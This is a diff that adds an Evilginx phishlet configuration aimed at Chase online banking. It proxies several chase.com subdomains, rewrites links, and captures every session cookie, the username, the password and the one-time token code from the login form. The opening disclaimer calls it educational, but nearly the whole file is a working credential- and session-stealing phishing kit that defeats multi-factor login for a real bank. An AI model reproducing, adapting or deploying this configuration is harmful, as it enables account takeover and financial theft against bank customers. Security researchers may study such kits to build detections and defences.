@@ -1,0 +1,90 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
+
+
+author: '@An0nud4y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'secure02ea', orig_sub: 'secure02ea', domain: 'chase.com', session: true, is_landing: true}
+  - {phish_sub: 'secure07ea', orig_sub: 'secure07ea', domain: 'chase.com', session: true, is_landing: true}
+  - {phish_sub: 'secure', orig_sub: 'secure', domain: 'chase.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'chase.com', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: '', domain: 'chase.com', session: true, is_landing: false}
+#  - {phish_sub: 'midas', orig_sub: 'midas', domain: 'chase.com', session: true, is_landing: false}  
+#  - {phish_sub: 'secure', orig_sub: 'secure', domain: 'chase.com', session: true, is_landing: false}  
+  - {phish_sub: 'secure06ea', orig_sub: 'secure06ea', domain: 'chase.com', session: true, is_landing: false}  
+  - {phish_sub: 'secure06ea', orig_sub: 'secure06ea', domain: 'chase.com', session: true, is_landing: false}  
+ 
+
+sub_filters:
+  - {triggers_on: 'secure02ea.chase.com', orig_sub: '', domain: 'chase.com', search: 'https://secure.{domain}/', replace: 'https://secure07ea.{domain}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'secure02ea.chase.com', orig_sub: '', domain: 'chase.com', search: 'secure.{domain}', replace: 'secure07ea.{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'secure02ea.chase.com', orig_sub: 'www', domain: 'chase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'secure02ea.chase.com', orig_sub: 'www', domain: 'chase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'secure02ea.chase.com', orig_sub: '', domain: 'chase.com', search: 'https://{domain}/', replace: 'https://{domain}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'secure02ea.chase.com', orig_sub: '', domain: 'chase.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'secure02ea.chase.com', orig_sub: 'secure02ea', domain: 'chase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'secure02ea.chase.com', orig_sub: 'secure02ea', domain: 'chase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'secure02ea.chase.com', orig_sub: 'midas', domain: 'chase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'secure02ea.chase.com', orig_sub: 'midas', domain: 'chase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'secure02ea.chase.com', orig_sub: 'secure06ea', domain: 'chase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'secure02ea.chase.com', orig_sub: 'secure06ea', domain: 'chase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'secure02ea.chase.com', orig_sub: 'secure06ea', domain: 'chase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'secure02ea.chase.com', orig_sub: 'secure06ea', domain: 'chase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'secure02ea.chase.com', orig_sub: 'secure', domain: 'chase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'secure02ea.chase.com', orig_sub: 'secure', domain: 'chase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'www.chase.com', orig_sub: 'www', domain: 'chase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.chase.com', orig_sub: 'www', domain: 'chase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.chase.com', orig_sub: '', domain: 'chase.com', search: 'https://{domain}/', replace: 'https://{domain}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.chase.com', orig_sub: '', domain: 'chase.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.chase.com', orig_sub: 'secure02ea', domain: 'chase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.chase.com', orig_sub: 'secure02ea', domain: 'chase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.chase.com', orig_sub: '', domain: 'chase.com', search: 'https://secure.{domain}/', replace: 'https://secure07ea.{domain}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.chase.com', orig_sub: '', domain: 'chase.com', search: 'secure.{domain}', replace: 'secure07ea.{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'www.chase.com', orig_sub: 'midas', domain: 'chase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'www.chase.com', orig_sub: 'midas', domain: 'chase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.chase.com', orig_sub: 'secure06ea', domain: 'chase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.chase.com', orig_sub: 'secure06ea', domain: 'chase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.chase.com', orig_sub: 'secure06ea', domain: 'chase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.chase.com', orig_sub: 'secure06ea', domain: 'chase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'www.chase.com', orig_sub: 'secure', domain: 'chase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'www.chase.com', orig_sub: '', domain: 'chase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+ 
+auth_tokens:
+  - domain: '.chase.com'
+    keys: ['.*,regexp']
+  - domain: 'secure02ea.chase.com'
+    keys: ['.*,regexp']
+  - domain: 'secure06ea.chase.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/overviewAccounts/*'
+credentials:
+  username:
+    key: 'auth_userId'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '^auth_passwd$'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'auth_tokencode'
+      search: '(.*)'
+      type: 'post'
+
+#force_post:
+#  - path: '/auth/fcc/login'
+#    search:
+#      - {key: 'auth_userId', search: '.*'}
+#      - {key: 'auth_passwd', search: '.*'}
+#    force:
+#      - {key: 'stay_signed_in', value: '1'}
+#    type: 'post'
+
+login:
+
+  domain: 'secure02ea.chase.com'
+  path: '/web/auth/#/logon/logon/chaseOnline'
